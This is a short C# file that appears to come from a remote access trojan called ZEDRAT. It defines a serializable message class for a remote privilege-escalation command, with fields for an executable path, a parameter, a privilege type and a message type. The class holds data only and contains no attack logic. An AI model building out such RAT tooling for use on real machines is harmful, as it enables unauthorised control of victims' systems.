using System;

namespace ZEDRAT.Messages
{
	[Serializable]
	public class Remote_PrivilegeEscalation_Message
	{
		public string ExecPath;

		public string parameter;

		public string PrivilegeType;

		public string MessageType;
	}
}
